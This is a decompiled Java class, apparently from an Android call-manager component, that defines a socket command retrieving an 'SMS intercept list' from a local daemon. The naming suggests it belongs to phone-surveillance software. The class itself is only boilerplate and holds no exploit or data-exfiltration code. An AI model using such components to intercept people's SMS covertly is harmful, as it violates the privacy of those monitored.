package com.vvt.callmanager.ref.command;

import com.fx.socket.SocketCmd;
import com.vvt.callmanager.ref.SmsInterceptList;

public class RemoteGetSmsInterceptList
  extends SocketCmd
{
  private static final long serialVersionUID = 9196497582127777767L;
  
  public RemoteGetSmsInterceptList(String paramString)
  {
    super(paramString, SmsInterceptList.class);
  }
  
  protected String getServerName()
  {
    return "com.fx.socket.callmgrd";
  }
  
  protected String getTag()
  {
    return "RemoteGetSmsInterceptList";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/ref/command/RemoteGetSmsInterceptList.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */